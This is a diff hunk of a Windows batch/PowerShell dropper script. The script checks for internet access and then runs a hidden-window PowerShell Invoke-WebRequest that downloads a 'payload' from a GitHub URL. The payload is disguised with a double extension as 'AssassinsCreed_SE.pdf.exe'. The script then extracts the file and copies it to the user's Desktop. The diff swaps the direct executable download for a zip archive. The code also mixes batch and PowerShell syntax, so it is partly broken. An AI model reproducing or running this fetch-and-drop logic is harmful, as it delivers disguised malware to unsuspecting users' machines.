@@ -39,14 +39,14 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 Check internet connectivity before downloading the payload
 call :check_internet
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/raw/de5323fee7f3ea849f8504aed1d3593af243e64d/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.zip -OutFile AssassinsCreed_SE.zip"
 
 $desktop =  "C:/Users/%USERNAME%/Desktop"
 $wd = $PWD
 
 cd $wd
 
-PowerShell -Command "Expand-Archive -Path 'AssassinsCreed_SE.pdf.zip' -DestinationPath 'AssassinsCreed_SE'"
+PowerShell -Command "Expand-Archive -Path 'AssassinsCreed_SE.zip' -DestinationPath '$desktop'"
 
 
 copy $wd/AssassinsCreed_SE/AssassinsCreed_SE.pdf.exe $desktop
